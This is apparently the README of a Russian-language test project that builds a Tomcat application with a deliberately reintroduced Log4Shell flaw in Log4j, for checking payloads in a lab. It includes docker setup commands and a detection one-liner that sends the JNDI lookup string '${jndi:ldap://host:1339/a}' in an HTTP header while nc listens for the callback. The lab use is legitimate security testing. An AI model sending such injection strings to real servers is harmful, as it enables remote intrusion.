## log4j-poc

Тестовое веб-приложение на основе Tomcat 10.1 (OpenJDK 21),
включающее уязвимую версию библиотеки Log4j 2.x версии 2.25
с внесенной уязвимостью Log4Shell. Уязвимое приложение
позволяет эксплуатацию в HTTP-заголовках, отправляемых в лог
Tomcat (/usr/local/tomcat/logs/catalina.out). Приложение
предназначено для целей тестирования и проверки полезных
нагрузок.

## Сборка и запуск

Для сборки и запуска необходима POSIX-совместимая операционная
система, включающая следующие компоненты:

- git
- docker
- curl

# сборка

```
git clone https://github.com/sercher/log4j-poc.git
cd log4j-poc
docker build -t log4j-poc:latest .
```

# запуск

```
docker run -d -p 8080:8080 --add-host=host:host-gateway log4j-poc
```

Запущенное приложение доступно по адресу

```
localhost:8080/myapp
```

Проверка lookup без добавления полезной нагрузки, например

```
(
  sleep 1 | nc -l 1339 &>/dev/null && echo '[!] VULNERABLE TO LOG4SHELL' &
  pid=$!
  curl -H 'Header-poc: ${jndi:ldap://host:1339/a}' 'http://localhost:8080/myapp/'
  sleep 3
  kill -9 $pid 2>/dev/null
)
```

Альтернативно можно использовать готовый собранный образ

```
docker pull sercher78/sercher:log4j-poc-small
```

Тогда запуск приложения будет осуществляться командой

```
docker run -d -p 8080:8080 --add-host=host:host-gateway sercher78/sercher:log4j-poc-small
```

Отчет об уязвимостях docker hub:
- [sercher78/sercher:log4j-poc-small](https://hub.docker.com/repository/docker/sercher78/sercher/tags/log4j-poc-small/sha256-a421b26712f4ba1989edcd9d7603dab011a6613b485f288d9f563adbf39742d0)

Обнаруженные уязвимости целиком находятся во внутреннем слое (tomcat:10)